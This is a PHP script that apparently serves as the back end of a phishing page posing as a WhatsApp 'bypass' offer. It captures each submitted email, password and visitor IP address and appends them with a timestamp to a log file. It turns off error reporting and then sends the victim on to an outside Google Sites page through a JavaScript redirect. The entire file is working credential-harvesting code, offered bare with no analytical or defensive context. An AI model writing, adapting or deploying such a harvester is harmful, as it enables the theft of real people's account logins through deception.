<?php
error_reporting(0);
$file = "fuckthemall.txt";

$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");


$handle = fopen($file, 'a');

fwrite($handle, "************++ByPass Whatsapp By*Au++************");

fwrite($handle, "\n");

fwrite($handle, "Email			:");

fwrite($handle, " $username");

fwrite($handle, "\n");

fwrite($handle, "Password		:");

fwrite($handle, " $password");

fwrite($handle, "\n");

fwrite($handle, "IP Address		: ");

fwrite($handle, " $ip");

fwrite($handle, "\n");

fwrite($handle, "Date Submitted	: ");

fwrite($handle, " $today");

fwrite($handle, "\n");

fwrite($handle, "-*********************++END++*********************");

fwrite($handle, "\n");

fwrite($handle, "\n");


fclose($handle);

echo "<script LANGUAGE=\"JavaScript\">

<!--

window.location=\"https://sites.google.com/view/sukses-join\";

// -->

</script>";

?>

